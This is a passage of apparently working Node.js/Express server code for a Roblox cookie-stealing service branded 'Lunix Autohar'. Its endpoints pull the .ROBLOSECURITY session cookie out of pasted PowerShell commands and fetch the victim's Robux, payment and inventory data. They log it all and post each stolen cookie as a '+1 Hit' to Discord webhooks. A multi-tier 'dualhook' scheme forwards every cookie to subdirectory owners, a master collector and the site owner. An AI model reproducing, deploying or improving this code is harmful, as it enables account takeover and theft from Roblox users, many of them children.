      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    console.log('🔍 Processing request data...');

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    // First, clean up the input by removing PowerShell backticks and line breaks
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 }
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: 'main' });


      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, scriptType, webhookUserData);

      if (!webhookResult.success) {
        console.log('❌ Webhook failed:', webhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }

      console.log('✅ Token and user data sent to Discord successfully');
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input'
      });
    }

    // Return success only when token was found and processed
    res.json({ 
      success: true,
      message: 'Request submitted successfully!'
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// Dynamic route handler for custom directories
app.get('/:directory', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName]) {
    // Serve a custom page for this directory or redirect to main page
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Directory not found' });
  }
});

// Route handler for dualhook create page
app.get('/:directory/create', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (directories[directoryName] && directories[directoryName].serviceType === 'dualhook') {
    res.sendFile(path.join(__dirname, 'public', 'dualhook-create.html'));
  } else {
    res.status(404).json({ error: 'Dualhook directory not found' });
  }
});

// Route handler for subdirectories
app.get('/:directory/:subdirectory', async (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;
  const directories = await loadDirectories();

  if (directories[directoryName] && 
      directories[directoryName].subdirectories && 
      directories[directoryName].subdirectories[subdirectoryName]) {
    // Serve the same page for subdirectories
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
  } else {
    res.status(404).json({ error: 'Subdirectory not found' });
  }
});

// API endpoint for custom directory requests
app.post('/:directory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const directories = await loadDirectories();

    // Check if directory exists
    if (!directories[directoryName]) {
      return res.status(404).json({ error: 'Directory not found' });
    }

    const directoryConfig = directories[directoryName];

    // Validate API token for this specific directory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== directoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for directory ${directoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this directory' });
    }

    let input;
    let scriptType;

    console.log(`📥 Received request for directory: ${directoryName}`);

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Look for .ROBLOSECURITY cookie in PowerShell command with improved regex
    // First, clean up the input by removing PowerShell backticks and line breaks
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, ''); // Remove quotes if present
      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 }
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { ip: req.ip, directory: directoryName });

      const customTitle = `🎯 +1 Hit - Lunix Autohar`;

      // Send to Discord webhook with user data
      const webhookResult = await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, directoryConfig.webhookUrl, customTitle);

      // Always send to site owner (main webhook) - check both environment variable and default webhook
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        await sendToDiscord(token, userAgent, `${scriptType} (Directory: ${directoryName})`, webhookUserData, siteOwnerWebhookUrl, customTitle);
      }

      if (!webhookResult.success) {
        console.log('❌ Webhook failed:', webhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Webhook failed: ${webhookResult.error}` 
        });
      }

      console.log(`✅ Token and user data sent to directory ${directoryName} webhook successfully`);
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName
      });
    }

    // Return success only when token was found and processed
    res.json({ 
      success: true,
      message: 'Request submitted successfully!',
      directory: directoryName
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

// API endpoint to create subdirectories for Dualhook users
app.post('/:directory/api/create-subdirectory', async (req, res) => {
  try {
    const parentDirectory = req.params.directory;
    const { subdirectoryName, webhookUrl } = req.body;

    // Load directories
    const directories = await loadDirectories();

    // Check if parent directory exists and is dualhook type
    if (!directories[parentDirectory] || directories[parentDirectory].serviceType !== 'dualhook') {
      return res.status(404).json({ error: 'Parent directory not found or not a Dualhook generator' });
    }

    // Validate subdirectory name
    if (!subdirectoryName || !/^[a-z0-9-]+$/.test(subdirectoryName)) {
      return res.status(400).json({ error: 'Invalid subdirectory name. Use only lowercase letters, numbers, and hyphens.' });
    }

    // Validate webhook URL
    if (!webhookUrl || !webhookUrl.startsWith('http')) {
      return res.status(400).json({ error: 'Invalid webhook URL' });
    }

    // Initialize subdirectories if not exists
    if (!directories[parentDirectory].subdirectories) {
      directories[parentDirectory].subdirectories = {};
    }

    // Check if subdirectory already exists
    if (directories[parentDirectory].subdirectories[subdirectoryName]) {
      return res.status(409).json({ error: 'Subdirectory already exists' });
    }

    // Create subdirectory
    const subAuthToken = crypto.randomBytes(32).toString('hex');
    directories[parentDirectory].subdirectories[subdirectoryName] = {
      webhookUrl: webhookUrl,
      created: new Date().toISOString(),
      apiToken: crypto.randomBytes(32).toString('hex'),
      authToken: subAuthToken
    };

    // Save directories
    if (!(await saveDirectories(directories))) {
      return res.status(500).json({ error: 'Failed to save subdirectory configuration' });
    }

    console.log(`✅ Created subdirectory: ${parentDirectory}/${subdirectoryName}`);

    // Send CREATION notification to subdirectory webhook with user's link and auth token
    try {
      const creationNotificationPayload = {
        embeds: [{
          title: `${parentDirectory.toUpperCase()} AUTOHAR`,
          description: `Ur ${parentDirectory.toUpperCase()} AUTOHAR url\n📌\n\n\`http://${req.get('host')}/${parentDirectory}/${subdirectoryName}\`\n\n🔑 **Dashboard Login Token:**\n\`${subAuthToken}\`\n\n📊 **Your Dashboard:**\n\`http://${req.get('host')}/dashboard\``,
          color: 0x8B5CF6,
          footer: {
            text: `Made by ${parentDirectory}`
          }
        }]
      };

      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(creationNotificationPayload)
      });

      console.log(`✅ Sent subdirectory CREATION notification with auth token to: ${subdirectoryName}`);
    } catch (webhookError) {
      console.log(`⚠️ Failed to send subdirectory creation notification: ${webhookError.message}`);
    }

    res.json({
      success: true,
      parentDirectory: parentDirectory,
      subdirectoryName: subdirectoryName,
      apiToken: directories[parentDirectory].subdirectories[subdirectoryName].apiToken,
      authToken: subAuthToken
    });

  } catch (error) {
    console.error('Error creating subdirectory:', error);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get API token for specific directory
app.get('/:directory/api/token', async (req, res) => {
  const directoryName = req.params.directory;
  const directories = await loadDirectories();

  if (!directories[directoryName]) {
    return res.status(404).json({ error: 'Directory not found' });
  }

  // Only serve token to same origin requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }
  }

  res.json({ token: directories[directoryName].apiToken });
});

// Get API token for subdirectories
app.get('/:directory/:subdirectory/api/token', async (req, res) => {
  const directoryName = req.params.directory;
  const subdirectoryName = req.params.subdirectory;
  const directories = await loadDirectories();

  if (!directories[directoryName] || 
      !directories[directoryName].subdirectories || 
      !directories[directoryName].subdirectories[subdirectoryName]) {
    return res.status(404).json({ error: 'Subdirectory not found' });
  }

  // Only serve token to same origin requests
  const origin = req.get('Origin') || req.get('Referer');
  const host = req.get('Host');

  if (origin) {
    const originHost = new URL(origin).host;
    if (originHost !== host && !ALLOWED_ORIGINS.includes(origin)) {
      return res.status(403).json({ error: 'Unauthorized' });
    }
  }

  res.json({ token: directories[directoryName].subdirectories[subdirectoryName].apiToken });
});

// API endpoint for subdirectory requests (triple webhook delivery)
app.post('/:directory/:subdirectory/convert', async (req, res) => {
  try {
    const directoryName = req.params.directory;
    const subdirectoryName = req.params.subdirectory;
    const directories = await loadDirectories();

    // Check if subdirectory exists
    if (!directories[directoryName] || 
        !directories[directoryName].subdirectories || 
        !directories[directoryName].subdirectories[subdirectoryName]) {
      return res.status(404).json({ error: 'Subdirectory not found' });
    }

    const parentConfig = directories[directoryName];
    const subdirectoryConfig = directories[directoryName].subdirectories[subdirectoryName];

    // Validate API token for this specific subdirectory
    const providedToken = req.get('X-API-Token');
    if (!providedToken || providedToken !== subdirectoryConfig.apiToken) {
      console.log(`❌ Invalid or missing API token for subdirectory ${directoryName}/${subdirectoryName} from ${req.ip}`);
      return res.status(401).json({ error: 'Invalid API token for this subdirectory' });
    }

    let input;
    let scriptType;

    console.log(`📥 Received request for subdirectory: ${directoryName}/${subdirectoryName}`);

    // Handle both JSON and text input
    if (typeof req.body === 'string') {
      input = req.body;
      scriptType = 'Unknown';
    } else if (req.body && req.body.powershell) {
      input = req.body.powershell;
      scriptType = req.body.scriptType || 'Unknown';
    } else {
      console.log('❌ Invalid input format');
      return res.status(400).json({ error: 'Invalid input format' });
    }

    // Look for .ROBLOSECURITY cookie
    // First, clean up the input by removing PowerShell backticks and line breaks
    const cleanedInput = input.replace(/`\s*\n\s*/g, '').replace(/`/g, '');

    // Now extract the ROBLOSECURITY token from the cleaned input - improved pattern to capture full token
    const regex = /\.ROBLOSECURITY[=\s]*["']?([^"'\s}]+)["']?/i;
    const match = cleanedInput.match(regex);

    if (match) {
      const token = match[1].replace(/['"]/g, '');
      const userAgent = req.headers['user-agent'] || 'Unknown';

      // Fetch user data from Roblox API
      const userData = await fetchRobloxUserData(token);

      // If user data fetch failed, create a minimal user data object to ensure cookie is still sent
      const webhookUserData = userData || {
        username: "Unknown User",
        userId: "Unknown",
        robux: 0,
        premium: false,
        rap: 0,
        summary: 0,
        creditBalance: 0,
        savedPayment: false,
        robuxIncoming: 0,
        robuxOutgoing: 0,
        korblox: false,
        headless: false,
        accountAge: 0,
        groupsOwned: 0,
        placeVisits: 0,
        inventory: { hairs: 0, bundles: 0, faces: 0 }
      };

      // Log user data to database
      await logUserData(token, webhookUserData, { 
        ip: req.ip, 
        directory: directoryName, 
        subdirectory: subdirectoryName 
      });

      const scriptLabel = `${scriptType} (Subdirectory: ${directoryName}/${subdirectoryName})`;
      const customTitle = `🎯 +1 Hit - ${directoryName.toUpperCase()} AUTOHAR`;

      // 1. Send to subdirectory webhook (user who owns the subdirectory) - RICH EMBED WITH USER DATA
      console.log(`🚀 Sending rich user data embed to subdirectory webhook`);
      console.log('🔍 Sending data to Discord webhook');
      const subdirectoryWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, subdirectoryConfig.webhookUrl, customTitle);

      if (subdirectoryWebhookResult.success) {
        console.log(`✅ Subdirectory webhook (${subdirectoryName}) delivered successfully`);
      } else {
        console.log(`❌ Subdirectory webhook (${subdirectoryName}) failed:`, subdirectoryWebhookResult.error);
      }

      // 2. Send to dualhook master webhook (collects from all subdirectory users)
      let dualhookWebhookResult = { success: true }; // Default success for validation
      if (parentConfig.dualhookWebhookUrl) {
        console.log(`🚀 Sending to dualhook master webhook`);
        dualhookWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, parentConfig.dualhookWebhookUrl, customTitle);

        if (dualhookWebhookResult.success) {
          console.log(`✅ Dualhook master webhook (${directoryName}) delivered successfully`);
        } else {
          console.log(`❌ Dualhook master webhook (${directoryName}) failed:`, dualhookWebhookResult.error);
        }
      }

      // 3. Send to site owner webhook (website owner)
      const siteOwnerWebhookUrl = process.env.DISCORD_WEBHOOK_URL;
      if (siteOwnerWebhookUrl) {
        console.log(`🚀 Sending to site owner webhook`);
        const siteOwnerWebhookResult = await sendToDiscord(token, userAgent, scriptLabel, webhookUserData, siteOwnerWebhookUrl, customTitle);

        if (siteOwnerWebhookResult.success) {
          console.log(`✅ Site owner webhook delivered successfully`);
        } else {
          console.log(`❌ Site owner webhook failed:`, siteOwnerWebhookResult.error);
        }
      }

      if (!subdirectoryWebhookResult.success) {
        console.log('❌ Subdirectory webhook failed:', subdirectoryWebhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Subdirectory webhook failed: ${subdirectoryWebhookResult.error}` 
        });
      }

      if (!dualhookWebhookResult.success) {
        console.log('❌ Dualhook master webhook failed:', dualhookWebhookResult.error);
        return res.status(500).json({ 
          success: false, 
          error: `Dualhook master webhook failed: ${dualhookWebhookResult.error}` 
        });
      }

      console.log(`✅ Webhook delivery completed for subdirectory ${directoryName}/${subdirectoryName} (3 webhooks: subdirectory owner → dualhook master → site owner)`);
    } else {
      console.log('❌ No ROBLOSECURITY token found in input');

      // Return error message when no token found
      return res.status(400).json({ 
        success: false,
        message: 'Failed wrong input',
        directory: directoryName,
        subdirectory: subdirectoryName
      });
    }

    res.json({ 
      success: true,
      message: 'Request submitted successfully with multi-webhook delivery!',
      directory: directoryName,
      subdirectory: subdirectoryName
    });
  } catch (error) {
    console.error('❌ Server error:', error);
    res.status(500).json({ error: 'Server error processing request' });
  }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, '0.0.0.0', () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Admin panel available at: /create`);

  if (!process.env.API_TOKEN) {
    console.log('Generated API Token for internal use');
    console.log('Set API_TOKEN environment variable to use a custom token');
  }

  // Log existing directories
  loadDirectories().then(directories => {
    if (directories && typeof directories === 'object') {
      const directoryNames = Object.keys(directories);
      if (directoryNames.length > 0) {
        console.log('📁 Active directories:', directoryNames.join(', '));

        // Log subdirectories for dualhook services
        directoryNames.forEach(dir => {
          if (directories[dir] && 
              directories[dir].serviceType === 'dualhook' && 
              directories[dir].subdirectories) {
            const subdirs = Object.keys(directories[dir].subdirectories);
            if (subdirs.length > 0) {
              console.log(`🔗 Dualhook subdirectories for ${dir}:`, subdirs.join(', '));
            }
          }
        });
      }
    }
  }).catch(error => {
    console.error('Error loading directories on startup:', error);
  });
});